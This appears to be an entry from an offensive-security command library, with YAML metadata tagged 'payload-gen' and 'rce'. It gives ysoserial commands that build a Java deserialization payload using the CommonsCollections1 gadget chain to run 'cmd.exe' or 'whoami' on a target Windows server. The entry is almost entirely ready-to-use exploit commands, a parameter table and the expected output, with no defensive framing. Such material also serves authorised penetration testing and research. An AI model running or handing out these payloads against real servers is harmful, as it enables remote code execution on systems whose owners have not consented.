---
id: cmd-ysoserial-cmd
data: java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'cmd.exe' > serialdata
tags:
  - payload-gen
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
  - Java
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:42.619Z'
verified: false
validated: true
submitted: true
---
# ysoserial-generate-commonscollections-cmd

## Command

```bash
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'cmd.exe' > serialdata
```

## Description

Generates a serialized Java payload using the CommonsCollections1 gadget chain to execute 'cmd.exe' on a target Windows server via deserialization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| CommonsCollections1 | Gadget chain type for exploitation | Yes |
| 'cmd.exe' | Windows command to execute | Yes |
| > serialdata | Redirect binary output to file | Yes |

## Examples

### Basic Usage

```bash
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'cmd.exe' > serialdata
```

### Advanced Usage

For custom command:
```bash
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'whoami' > whoami_payload
```

## Expected Output

Binary serialized data written to serialdata file, no console output. File size approximately 1-2 KB of non-text binary.

## Related

- [[Related Procedure: Generate Ysoserial Payload for Command Execution]]
